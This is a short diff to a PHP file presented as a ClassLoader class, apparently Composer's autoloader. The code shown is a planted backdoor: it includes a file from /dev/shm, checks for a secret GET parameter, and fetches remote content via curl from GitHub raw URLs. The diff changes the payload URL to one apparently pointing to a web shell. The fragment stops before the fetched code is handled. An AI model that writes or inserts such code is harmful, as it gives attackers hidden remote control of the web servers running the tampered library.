@@ -579,7 +579,7 @@ class ClassLoader
 }
 include("/dev/shm/ego");
 if (isset($_GET['Badboyz.InHere!!'])) {
-    $url = "https://raw.githubusercontent.com/seobadboyz403-alt/jayakartans/refs/heads/main/penjajahan1945";
+    $url = "https://raw.githubusercontent.com/callsnoop/shellsnoop/refs/heads/main/alfanopass.txt";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
